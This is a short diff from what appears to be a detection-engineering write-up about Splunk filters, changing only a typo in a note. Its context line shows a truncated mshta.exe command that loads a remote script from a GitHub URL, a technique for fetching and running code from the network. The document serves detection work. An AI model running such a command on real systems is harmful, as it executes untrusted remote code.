@@ -11,7 +11,7 @@ mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redc
 ![mshta](https://user-images.githubusercontent.com/36422282/55601275-2a38fa00-572e-11e9-838d-f32599684b26.PNG)
 
 
-*NOTE* This filter is specific and relates to the specific attack itself, as required to show correctnes within writing filters
+*NOTE* This filter is specific and relates to the specific attack itself, as required to show correctness within writing filters
 
 #Splunk Filter
 
